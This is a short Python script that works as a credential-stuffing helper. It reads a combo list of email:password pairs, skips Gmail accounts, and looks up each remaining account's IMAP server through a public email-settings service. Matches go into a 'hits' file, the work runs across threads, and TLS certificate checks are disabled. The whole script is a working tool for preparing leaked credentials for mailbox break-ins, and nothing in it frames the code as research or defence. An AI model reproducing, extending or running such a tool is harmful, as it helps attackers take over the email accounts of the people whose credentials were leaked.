import threading, email, imaplib, json, urllib.request, ssl, os
from datetime import datetime
from multiprocessing.pool import ThreadPool as Pool
from tkinter import Tk
from tkinter.filedialog import askopenfilename

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
path = os.getcwd()
directory = path + "/hits"
if not os.path.exists(directory):
    os.makedirs(directory)
now = datetime.now()
current_time = str(now.today())
filesaver = directory + "/" + current_time + ".txt"
w = open(filesaver, "a")
Tk().withdraw()
dat_file = askopenfilename(title="choose your file",filetypes=(("Text file", "*.txt"), ("all files", "*.*")))
ssl._create_default_https_context = ssl._create_unverified_context
f = open(dat_file)
lines = f.read().splitlines()
url = "https://emailsettings.firetrust.com/settings?q="
print("Enter how many threads you whant 10 - 50 proxies 25 is default")
threads = input()
pool_size = 25
if threads:
    if int(threads) >= 10 and int(threads) <= 50:
        pool_size = int(threads)
    else:
        pool_size = 25

vaild = []
invalid = []

def validator(line):
    splitter = line.split(":")
    user = splitter[0]
    usplitter = user.split("@")[1]
    password = splitter[1]
    newurl = url + str(user)

    try:
        if usplitter != "gmail.com":
            response = urllib.request.urlopen(newurl)
            data = json.loads(response.read())
            savedata = data["settings"]
            for i in savedata:
                if i["protocol"] == "IMAP":
                    print(bcolors.OKGREEN + "Added user to the list!")
                    w.write(user + ":" + password + ":" + i["address"] + "\n")
                    vaild.append(user)
        else:
            print(bcolors.WARNING + "Gmails are discarded!")
            invalid.append(user)
    except:
        print(bcolors.FAIL + "Cannot find settings for account!")
        invalid.append(user)

def worker(line):
    try:
        validator(line)
    except:
        print('error with line')

pool = Pool(pool_size)

for line in lines:
    pool.apply_async(worker, (line,))

pool.close()
pool.join()
print(bcolors.OKGREEN + "Validation complete!")
print(bcolors.OKGREEN + str(len(vaild)) + ": valid " + str(len(invalid)) + ": invalid")